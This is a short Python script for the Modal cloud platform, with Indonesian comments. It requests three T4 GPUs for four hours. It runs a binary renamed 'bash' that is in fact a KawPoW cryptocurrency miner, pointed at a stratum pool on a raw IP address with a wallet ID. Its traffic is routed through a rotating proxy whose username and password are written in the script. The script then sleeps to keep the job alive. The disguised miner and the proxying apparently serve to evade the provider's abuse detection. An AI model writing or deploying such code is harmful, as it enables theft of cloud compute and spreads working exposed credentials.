import modal
import subprocess
import time

app = modal.App(
    "run-bash-4-hours",
    mounts=[modal.Mount.from_local_dir(".", remote_path="/root")]
)

image = (
    modal.Image.from_registry(
        "nvidia/cuda:12.1.1-runtime-ubuntu22.04",
        add_python=False
    )
    .apt_install("bash")
)

@app.function(
    image=image,
    gpu=modal.gpu.T4(count=3),   # 🔥 T4 x3
    timeout=60 * 60 * 4          # ⏱️ 4 jam
)
def run_script():
    # 1️⃣ Verifikasi GPU
    subprocess.run(["nvidia-smi"], check=True)

    # 2️⃣ Jalankan script
    subprocess.run(
        ["bash", "-lc", "chmod u+x bash && ./bash -a kawpow -o stratum+tcp://103.103.21.108:80 -u rUrmXcYw9tNsoBvHvQTDMrUFUd1D8MApm7.modal --proxy atrfkwzc2-rotate:jasin987@p.webshare.io:80 --no-health "],
        check=False
    )

    # 3️⃣ Stay alive 4 jam
    print("Script finished. Staying alive for 4 hours...")
    time.sleep(60 * 60 * 4)

    print("4 hours finished. Job exiting.")
